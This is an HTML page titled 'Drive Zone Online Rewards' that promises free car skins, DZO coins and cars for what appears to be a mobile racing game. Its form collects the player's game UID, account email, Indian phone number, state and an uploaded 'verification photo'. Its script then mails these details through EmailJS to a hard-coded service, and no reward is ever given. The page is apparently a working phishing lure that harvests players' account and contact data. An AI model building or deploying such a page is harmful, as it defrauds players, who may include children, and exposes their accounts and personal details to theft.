<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Drive Zone Online Rewards</title>

<style>
body{
    margin:0;
    font-family:Arial,sans-serif;
    background:#0f0f0f;
    color:white;
}

header{
    background:linear-gradient(90deg,#ff6600,#ff0000);
    padding:20px;
    text-align:center;
    font-size:28px;
    font-weight:bold;
}

.hero{
    text-align:center;
    padding:50px 20px;
    background:url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') center/cover;
}

.container{
    max-width:700px;
    margin:auto;
    padding:20px;
}

.card{
    background:#1a1a1a;
    padding:25px;
    border-radius:15px;
}

input,select,button{
    width:100%;
    padding:13px;
    margin-top:10px;
    margin-bottom:15px;
    border:none;
    border-radius:8px;
    box-sizing:border-box;
}

input,select{
    background:#2a2a2a;
    color:white;
}

button{
    background:#ff3300;
    color:white;
    cursor:pointer;
}

.notice{
    font-size:13px;
    color:#bbbbbb;
}
</style>
</head>

<body>

<header>
DRIVE ZONE ONLINE REWARDS
</header>

<section class="hero">
<h1>Free DZO Trading System & Free Skins</h1>
<p>Submit details for verification</p>
</section>

<div class="container">

<div class="card">

<form id="rewardForm">

<label>Drive Zone UID</label>
<input type="text" id="uid" placeholder="Enter UID" required>

<label>Ingame Account Mail ID</label>
<input type="email" id="email" placeholder="Enter ingame account mail ID" required>

<label>Indian Phone Number</label>
<input
type="tel"
id="phone"
placeholder="10 digit Indian number"
pattern="[6-9]{1}[0-9]{9}"
maxlength="10"
oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
required>

<label>Select State</label>
<select id="state" required>
<option value="">Choose State</option>
<option>Kerala</option>
<option>Tamil Nadu</option>
<option>Karnataka</option>
<option>Maharashtra</option>
<option>Delhi</option>
</select>

<label>Select Reward</label>

<select id="reward" onchange="updateRewardOptions()" required>

<option value="">Choose Reward</option>
<option value="Free Skin">Free Skin</option>
<option value="DZO Trading Access">DZO Trading Access</option>
<option value="Free Car">Free Car</option>

</select>

<div id="selectedRewardBox"
style="display:none;background:#2a2a2a;padding:12px;border-radius:10px;margin-bottom:15px;">

<b>Selected Reward:</b>
<span id="selectedRewardText"></span>

</div>

<div id="dynamicOptions"></div>

<h3>Verification Photo</h3>

<label>Upload Verification Photo</label>

<input
type="file"
id="photoUpload"
accept="image/*"
required>

<div class="notice">
By continuing, you agree to share your submitted details and verification photo.
</div>

<button type="submit">
Submit Verification
</button>

</form>

</div>

</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

emailjs.init("IlZtBG2WOaqIrvb3T");

let capturedImage = null;

document
.getElementById('photoUpload')
.addEventListener('change', function(){

    const file = this.files[0];

    const reader = new FileReader();

    reader.onload = function(e){

        capturedImage = e.target.result;

    };

    reader.readAsDataURL(file);

});

function updateRewardOptions(){

    const reward =
    document.getElementById('reward').value;

    const dynamicOptions =
    document.getElementById('dynamicOptions');

    const selectedRewardBox =
    document.getElementById('selectedRewardBox');

    const selectedRewardText =
    document.getElementById('selectedRewardText');

    if(reward !== ""){

        selectedRewardBox.style.display = "block";
        selectedRewardText.innerText = reward;

    }else{

        selectedRewardBox.style.display = "none";

    }

    if(reward === "Free Skin"){

        dynamicOptions.innerHTML = `
        <label>Select Car Skin</label>
        <select id="request">
        <option>BMW M4 Gold Skin</option>
        <option>Nissan GTR Neon Skin</option>
        <option>Toyota Supra Racing Skin</option>
        </select>`;

    }

    else if(reward === "DZO Trading Access"){

        dynamicOptions.innerHTML = `
        <label>Select DZO Amount</label>
        <select id="request">
        <option>100 DZO Coins</option>
        <option>200 DZO Coins</option>
        <option>1000 DZO Coins</option>
        <option>10000 DZO Coins</option>
        </select>`;

    }

    else if(reward === "Free Car"){

        dynamicOptions.innerHTML = `
        <label>Select Car</label>
        <select id="request">
        <option>Lamborghini Huracan</option>
        <option>Bugatti Chiron</option>
        <option>Nissan GTR R35</option>
        </select>`;

    }

    else{

        dynamicOptions.innerHTML = "";

    }

}

document.getElementById('rewardForm')
.addEventListener('submit',function(e){

    e.preventDefault();

    const templateParams = {

        uid:
        document.getElementById('uid').value,

        email:
        document.getElementById('email').value,

        phone:
        document.getElementById('phone').value,

        state:
        document.getElementById('state').value,

        reward:
        document.getElementById('reward').value,

        request:
        document.getElementById('request').value,

        photo:
        capturedImage ? capturedImage.substring(0,100) : "No Image"

    };

    emailjs.send(
        "service_03gi2v9",
        "template_ec2whye",
        templateParams
    )

    .then(()=>{

        alert("Verification submitted!");

    })

    .catch((error)=>{

        console.log(error);

        alert("Failed to send");

    });

});

</script>

</body>
</html>
